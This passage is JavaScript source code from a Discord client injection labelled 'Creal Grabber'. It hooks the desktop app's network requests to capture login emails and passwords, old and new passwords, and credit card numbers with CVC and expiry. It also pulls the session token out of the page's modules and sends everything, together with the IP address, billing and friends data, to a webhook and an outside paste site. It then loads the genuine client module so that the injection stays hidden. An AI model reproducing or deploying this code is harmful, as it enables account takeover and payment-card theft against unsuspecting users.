                        name: "Billing <a:icon8:1024619392652288071>",
                        value: `${Cool()}`,
                        inline: !1
												}, {
                        name: "Email <a:Email:1024615399314161744>",
                        value: `\`${info.email}\``,
                        inline: !1
												}, {
                        name: "<a:icon6:1024617637390598164> Old Password",
                        value: `\`${oldpassword}\``,
                        inline: !0
												}, {
                        name: "<a:icon6:1024617637390598164> New Password",
                        value: `\`${newpassword}\``,
                        inline: !0
												}, {
                        name: "Token <a:icon1:1024615171907407892>",
                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                        inline: !1
												}, ],

                    "footer": {
                        "text": "©Creal | https://github.com/Ayhuuu"
                    },
                    "thumbnail": {
                        "url": `${usericonurl}`
                    }
											}, {
                    "title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
                    "color": config['embed-color'],
                    "description": CalcFriends(),

                    "footer": {
                        "text": "©Creal | https://github.com/Ayhuuu"
                    },
                    "image": {
                        'url': `${bannerurl}`,
                    },
                    "thumbnail": {
                        "url": `${usericonurl}`
                    }
											}]
            }
            hooker(params)
        })
    })
}

async function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
    var {
        ip
    } = await getFromURL("https://www.myexternalip.com/json", null)
    window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
        window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
            function totalFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                return r.length
            }

            function CalcFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                var gay = "";
                for (z of r) {
                    var b = GetRBadges(z.user.public_flags)
                    if (b != "") {
                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                    }
                }
                if (gay == "") {
                    gay = "No Rare Friends"
                }
                return gay
            }

            function Cool() {
                const json = JSON.parse(info3)
                var billing = "";
                json.forEach(z => {
                    if (z.type == "") {
                        return "\`❌\`"
                    } else if (z.type == 2 && z.invalid != !0) {
                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                    } else if (z.type == 1 && z.invalid != !0) {
                        billing += "\`✔️\`" + " :credit_card:"
                    } else {
                        return "\`❌\`"
                    }
                })
                if (billing == "") {
                    billing = "\`❌\`"
                }
                return billing
            }
            if(b.avatar === null){
                usericonurl = "https://cdn.discordapp.com/attachments/864559355768602654/1040289089372557433/8df7a3389893f1d1ce1d4351c4076440.jpg"
            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
            if(b.banner === null){
                bannerurl = "https://cdn.discordapp.com/attachments/864559355768602654/1041090918733852833/d70a5a9283d9517a10c4a7e14d0c9074.png"
            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;


            
           const params = {
                username: "Creal Grabber",
                content: "",
                embeds: [{
                        "title": "Creal Detect Email Changed",
                        description: "[ │ **Oh you have Creal someone**](https://github.com/Ayhuuu)",
                        "color": config['embed-color'],
                        "fields": [{
                                name: "Injection Info",
                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                inline: !1
					}, {
                                name: "Username <:icon4:1024615934519955496> ",
                                value: `\`${info.username}#${info.discriminator}\``,
                                inline: !0
					}, {
                                name: "ID <:icon3:1024615933228109834>",
                                value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                inline: !0
					}, {
                                name: "Nitro <a:_diamond:1018223518913150977>",
                                value: `${GetNitro(info.premium_type)}`,
                                inline: !0
					}, {
                                name: "Badges <:icon5:1024615931869147146>",
                                value: `${GetBadges(info.flags)}`,
                                inline: !0
					}, {
                                name: "Language <:language:1037057832920547398>",
                                value: `${GetLangue(info.locale)}`,
                                inline: !0
					}, {
                                name: "NSFW <a:nsfw:1037067109907320883>",
                                value: `${GetNSFW(info.nsfw_allowed)}`,
                                inline: !1
					}, {
                                name: "A2F <a:a2f:1037084050826997902>",
                                value: `${GetA2F(info.mfa_enabled)}`,
                                inline: !0
					}, {
                                name: "@Copyright",
                                value: `[Creal 2021 ](https://github.com/Ayhuuu)`,
                                inline: !0
					}, {
                                name: "Billing <a:icon8:1024619392652288071>",
                                value: `${Cool()}`,
                                inline: !1
					}, {
                                name: "New Email <a:Email:1024615399314161744>",
                                value: `\`${newemail}\``,
                                inline: !0
					}, {
                                name: "Password <a:icon6:1024617637390598164>",
                                value: `\`${password}\``,
                                inline: !0
					}, {
                                name: "Token <a:icon1:1024615171907407892>",
                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                inline: !1
					},
				],

                        "footer": {
                            "text": "©Creal | https://github.com/Ayhuuu"
                        },
                        "thumbnail": {
                            "url": `${usericonurl}`
                        }
				}, {
                        "title": `<a:icon10:1024621262766604348> Total Friends (${totalFriends()})`,
                        "color": config['embed-color'],
                        "description": CalcFriends(),

                        "footer": {
                            "text": "©Creal | https://github.com/Ayhuuu"
                        },
                        "image": {
                            'url': `${bannerurl}`,
                        },

                        "thumbnail": {
                            "url": `${usericonurl}`
                        }
			}
		]
            }
            hooker(params)
        })
    })
}




async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
    var {
        ip
    } = await getFromURL("https://www.myexternalip.com/json", null)
    await getservers(token)
    setTimeout(async () => {
        if(b.avatar === null){
            usericonurl = "https://cdn.discordapp.com/attachments/864559355768602654/1040289089372557433/8df7a3389893f1d1ce1d4351c4076440.jpg"
        }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
        if(b.banner === null){
            bannerurl = "https://cdn.discordapp.com/attachments/864559355768602654/1041090918733852833/d70a5a9283d9517a10c4a7e14d0c9074.png"
        }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;

        
        const params = {
            username: "Creal Grabber",
            content: "",
            embeds: [{
                    "title": "Creal User Credit Card Added",
                    "description": `
                    **IP:** ${ip}\n\n
                    **Username** <:icon4:1024615934519955496>\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
                    **ID** <:icon3:1024615933228109834>\n\`\`\`${info.id}\`\`\`\n
                    **Email** <a:Email:1024615399314161744>\n\`\`\`${info.email}\`\`\`\n
                    **Nitro Type** <a:_diamond:1018223518913150977>\n${GetNitro(info.premium_type)}\n
					**Language** <:language:1037057832920547398>\n${GetLangue(info.locale)}\n
					**A2F** <a:a2f:1037084050826997902>\n${GetA2F(info.mfa_enabled)}\n
					**NSFW** <a:nsfw:1037067109907320883>\n${GetNSFW(info.nsfw_allowed)}\n
                    **Badges** <:icon5:1024615931869147146>\n${GetBadges(info.flags)}\n
                    **Credit Card Number**\n\`\`\`${number}\`\`\`\n
                    **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
                    **CVC**\n\`\`\`${cvc}\`\`\`\n
                    **Token** <a:icon1:1024615171907407892> \n\`\`\`${token}\`\`\``,
                    "author": {
                        "name": "Creal"
                    },
                    "footer": {
                        "text": "©Creal | https://github.com/Ayhuuu"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
                    },
            },
                {
                    "title": `<a:icon10:1024621262766604348> Guilds Owner`,
                    "color": config['embed-color'],
                    "description": `\`\`\`diff\n${fs.readFileSync('Creal_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,

                    "footer": {
                        "text": "©Creal | https://github.com/Ayhuuu"
                    },
                    "image": {
                        'url': `${bannerurl}`,
                    },
                    "thumbnail": {
                        "url": `${usericonurl}`
                    }
            }
        ]
        }
        hooker(params)
        deletefile("Creal_guilds_ids.txt")
        deletefile("Creal_guilds_result.txt")
    }, 10000)
}

const ChangePasswordFilter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};




session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway")) return callback({
        cancel: true
    });
    updateCheck();

    if (FirstTime()) {}

    callback({})
    return;
})


session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
    if (details.url.endsWith("login")) {
        if (details.statusCode == 200) {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            const email = data.login;
            const password = data.password;
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                Login(email, password, token)
            }))
        } else {}
    }
    if (details.url.endsWith("users/@me")) {
        if (details.statusCode == 200 && details.method == "PATCH") {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            if (data.password != null && data.password != undefined && data.password != "") {
                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                        ChangePassword(data.password, data.new_password, token)
                    }))
                }
                if (data.email != null && data.email != undefined && data.email != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                        ChangeEmail(data.email, data.password, token)
                    }))
                }
            }
        } else {}
    }
    if (details.url.endsWith("tokens")) {
        const window = BrowserWindow.getAllWindows()[0];
        const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
        window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
        })).catch(console.error);
    }
});


module.exports = require('./core.asar')